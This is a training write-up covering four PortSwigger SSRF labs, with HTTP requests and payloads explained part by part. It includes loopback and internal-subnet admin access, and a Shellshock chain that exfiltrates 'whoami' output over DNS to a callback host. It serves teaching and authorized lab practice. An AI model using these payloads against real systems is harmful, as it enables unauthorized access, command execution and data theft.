# 02 — Basic SSRF & Blind SSRF

Maps to PortSwigger Academy SSRF labs #1, #2, #6, #7 (verified official order).
Labs #3, #4, #5 are filter-bypass labs and are covered in file 03, since they
test a different skill (defeating a defense) rather than the base technique.

---

## 2.1 Basic SSRF Against the Local Server

**Lab: "Basic SSRF against the local server"**

### The scenario

A stock-checking feature sends a request like this when a user clicks "Check
stock":

```
POST /product/stock HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

The `stockApi` parameter is a full URL the server fetches server-side and
returns the result of. That's the vulnerability surface: whatever you put in
`stockApi`, the *server* requests — not your browser.

### The payload, broken down

```
stockApi=http://localhost/admin
```

| Part | What it does | Why it matters |
|---|---|---|
| `http://` | Scheme. Tells the server's HTTP client library to make a standard HTTP request. | Some SSRF filters only check for specific schemes; using the expected one avoids triggering naive scheme blocks. |
| `localhost` | Resolves to `127.0.0.1` — the loopback interface, i.e., "this same machine." | The admin panel may be bound to listen on all interfaces but only have its access-control middleware exempt requests that *appear* to originate from `127.0.0.1`/`localhost`. The server, fetching this URL on its own behalf, satisfies that check. |
| `/admin` | The path to the otherwise-protected admin interface. | A direct browser request to `https://target.com/admin` would be blocked by access control (e.g. at a reverse proxy in front of the app). Because the *app server itself* is now the one issuing the request, that front-door check is bypassed entirely — the request never crosses the boundary where the check lives. |

### Why this isn't "just a redirect" — the mechanism

This is the core SSRF mechanism you need to be able to explain in a report: the
access control check is implemented at a point in the request path that the
forged request skips. Common reasons this gap exists:
- The check lives in a reverse proxy / WAF in front of the app, and that
  component never sees the app-server-to-app-server request.
- The app intentionally trusts `127.0.0.1` as a disaster-recovery backdoor (so
  an admin with server access can always get in even with credentials lost).
- The admin interface listens on a different port not exposed externally, but
  the app server (on the same host) can still reach it over loopback.

### Completing the lab

After confirming `/admin` is reachable, you read the returned HTML to find the
delete-user endpoint, then repeat the SSRF against that endpoint:

```
stockApi=http://localhost/admin/delete?username=carlos
```

Same mechanism — the `username=carlos` query parameter is just the admin
panel's own expected input, now reached via the forged loopback request instead
of a direct (blocked) browser request.

---

## 2.2 Basic SSRF Against Another Back-End System

**Lab: "Basic SSRF against another back-end system"**

### The scenario

Same stock-checker feature, but this time the admin interface isn't on
`localhost` — it's on a *different host* inside the internal network, on a
non-standard port, and you don't know its exact IP.

### The payload, broken down

```
stockApi=http://192.168.0.X:8080/admin
```

| Part | What it does | Why it matters |
|---|---|---|
| `192.168.0.X` | RFC 1918 private address — only routable inside the organization's internal network. | Your browser can never reach this directly from the internet. The vulnerable server, however, sits inside that network and can route to it. |
| `:8080` | Non-default HTTP port. | Internal admin tools are frequently put on non-standard ports as a (weak) form of "security through obscurity" — this defense does nothing once you can make the server itself probe ports. |
| `X` (the final octet, unknown) | The specific host hosting the admin panel within the `/24` subnet. | You don't know this in advance — you have to discover it. |

### The discovery technique: turning the SSRF into a port/host scanner

Because you don't know which of the 256 possible hosts in `192.168.0.0/24` is
running the admin panel, you use Burp Intruder to brute-force it:

1. Send the stock-check request to Burp Repeater first, confirm the SSRF is
   live by pointing it at a known-bad IP and seeing the error change to a
   timeout/connection-refused vs. a generic error.
2. Send to Burp Intruder. Set the payload position on the final octet:
   `http://192.168.0.§1§:8080/admin`
3. Payload type: **Numbers**, range 1–255, step 1. This iterates the entire
   subnet automatically — Intruder substitutes each number in turn for `§1§`
   and fires a request.
4. Sort the results by **status code**. A `200 OK` on one specific request
   stands out from the `000`/timeout/connection-refused responses for the
   hosts with nothing listening on port 8080.

This is the real-world technique for **internal network reconnaissance via
SSRF** — you are using the vulnerable server as a blind port scanner into a
network you cannot otherwise reach. This exact technique generalizes directly
into the `portscan` and `networkscan` modules of SSRFmap (file 05).

### Completing the lab

Once you've found the host (e.g., `192.168.0.23:8080`), repeat the pattern from
2.1: read the admin HTML, find the delete endpoint, hit it via the SSRF.

---

## 2.3 Blind SSRF With Out-of-Band (OOB) Detection

**Lab: "Blind SSRF with out-of-band detection"**

### The scenario

A site uses server-side analytics software that fetches whatever URL appears
in the `Referer` header of incoming requests — presumably to analyze referring
sites and their anchor text. Crucially: **the response of that fetch is never
shown to you anywhere.** This is the defining condition of blind SSRF: you can
trigger the request, but you get zero visible feedback from it.

### The payload, broken down

```
Referer: http://YOUR-SUBDOMAIN.oastify.com
```

| Part | What it does | Why it matters |
|---|---|---|
| `Referer:` header | Normally just tells the server "the user came from this page." Here it's the injection point — the analytics tool trusts and fetches whatever URL value is in it. | This is a classic "hidden attack surface" SSRF vector: nobody thinks of a header as a place a full URL gets parsed and fetched, but the analytics tool's job description is literally "fetch the referring URL." |
| `YOUR-SUBDOMAIN.oastify.com` | A unique, attacker-generated subdomain on Burp Collaborator's public OAST infrastructure. | Because you can't see the response, you need an **out-of-band** channel: a destination that you control and can monitor independently, completely outside the application's own response flow. When the server's analytics tool fetches this URL, it has to perform a DNS lookup for `YOUR-SUBDOMAIN.oastify.com` and (depending on what's listening) an HTTP request — both of which get logged by Burp Collaborator. |

### Why OOB is the correct technique here — the mechanism

You cannot use `curl -v` style verbose-response debugging because there *is no
response path back to you*. The only proof of exploitation is a side channel:
a DNS query or HTTP hit arriving at infrastructure you control, with a
timestamp that correlates to when you sent the request. This is the same
principle behind blind SQL injection (time delays as a side channel) and blind
XXE — when the primary feedback path is cut off, you manufacture a secondary
one.

### Confirming the lab

After sending the request with the Collaborator payload in `Referer`, you poll
Burp Collaborator's client and look for an incoming DNS and/or HTTP interaction
originating from the target's infrastructure. That interaction **is** the
proof of the SSRF — no application response is needed at all.

---

## 2.4 Blind SSRF With Shellshock Exploitation

**Lab: "Blind SSRF with Shellshock exploitation"**

This is the lab that demonstrates *why* blind SSRF still matters even when you
can't read responses: you can chain it into a vulnerability on the back-end
system itself to achieve remote code execution, and exfiltrate the result
purely out-of-band.

### The scenario

Same `Referer`-fetching analytics behavior as 2.3, but this time the goal is to
reach an internal server in the `192.168.0.X:8080` range that is running a
CGI script vulnerable to **Shellshock** (CVE-2014-6271) — a Bash environment
variable parsing bug where a specially crafted value, once placed into an
environment variable Bash will parse (commonly via CGI scripts that pass HTTP
headers into env vars), executes arbitrary shell commands.

### Step 1 — find the internal host

Same Intruder-driven subnet sweep as 2.2, but this time fired at the
`Referer` header instead of a URL parameter, since that's the injection point
in this lab.

### Step 2 — the Shellshock payload, broken down

```
() { :; }; ping -c 1 SUBDOMAIN.oastify.com
```

| Part | What it does | Why it matters |
|---|---|---|
| `() { :; };` | A syntactically valid (but functionally empty) Bash function definition — `:` is Bash's no-op builtin. | This is the actual Shellshock trigger. Vulnerable Bash versions, when parsing an environment variable that *looks like* a function definition, continue parsing and executing whatever comes *after* the closing `;` of the function body — even though a function definition shouldn't execute anything at assignment time. The vulnerability is that Bash doesn't stop parsing where it should. |
| `;` after the function | Terminates the (empty) function definition. | Marks the boundary between "this is a function" and "now here's a command to run." |
| `ping -c 1 SUBDOMAIN.oastify.com` | The actual command Bash executes due to the bug. | `ping` is chosen deliberately — it reliably triggers a DNS lookup (often before ICMP even leaves the host, depending on resolver behavior) which is visible via Collaborator even if ICMP itself is firewalled outbound. `dig`/`getent`/`host`/`nslookup` are commonly cited as alternatives; plain DNS-lookup-only tools without an actual network round trip can sometimes fail to trigger if a server short-circuits resolution, so `ping`/`nslookup`/`host` are the more reliable choices in practice. |
| `-c 1` | Limits ping to exactly one ICMP packet. | Avoids hanging the command / generating excess noise — you only need one successful lookup to prove execution. |

### Step 3 — delivering the payload via the User-Agent header

The vulnerable CGI script in this lab passes the `User-Agent` header into a
Bash-executed environment, so the full attack request looks like:

```
GET /resources/css/labsBlog.css HTTP/1.1
Host: 192.168.0.X:8080
User-Agent: () { :; }; ping -c 1 SUBDOMAIN.oastify.com
Referer: http://YOUR-COLLABORATOR-ID.oastify.com/
```

Notice there are **two** OOB channels at once here in the real lab flow: the
`Referer` is what gets the *target application* to make the internal request
in the first place (the original blind SSRF vector), and the `User-Agent`
carries the Shellshock payload that the *internal* vulnerable host then
executes.

### Step 4 — exfiltrating data, not just proving execution

Proving code execution is step one; the actual lab goal is to exfiltrate the
OS username (`whoami`). Since there's no response channel, you embed the
*command's output* into the DNS query itself:

```
() { :; }; ping -c 1 $(whoami).SUBDOMAIN.oastify.com
```

| Part | What it does | Why it matters |
|---|---|---|
| `$(whoami)` | Bash command substitution — runs `whoami` and inlines its stdout into the string before the outer command runs. | This is the exfiltration trick for any blind, output-less RCE: you can't read a response, but you *can* read which subdomain showed up in your DNS logs. If `whoami` returns `peter`, the actual DNS query becomes `peter.SUBDOMAIN.oastify.com` — and that exact string is what you see land in Burp Collaborator. |

### The bigger lesson

Blind SSRF is never "just" a confirmation-only bug. The mechanism that lets you
*detect* it (OOB DNS/HTTP callbacks) is the exact same mechanism that lets you
*exfiltrate data* once you've chained it into command execution on the
back-end target. This pattern — OOB detection, then OOB exfiltration via
command substitution into a DNS query — generalizes to essentially any blind
RCE chain, not just Shellshock specifically.

## Real-World Notes

- Shellshock itself is a 2014 CVE, but the *lesson* (environment-variable-based
  command injection reachable through any header a back-end script blindly
  trusts) recurs constantly in internal/legacy systems that get reached via
  SSRF pivots — internal admin tools and legacy CGI scripts are exactly the
  kind of system that sits behind a "trusted internal network" boundary and
  never gets patched because "nothing external can reach it." SSRF is precisely
  what breaks that assumption.
- In bug bounty programs, blind SSRF findings via `Referer`, webhook URLs, or
  PDF/image-rendering features are routinely reported using nothing but a
  Burp Collaborator/interactsh callback as proof — you do not need to achieve
  RCE to have a valid, reportable finding; the OOB interaction alone
  demonstrates server-side request forgery occurred.
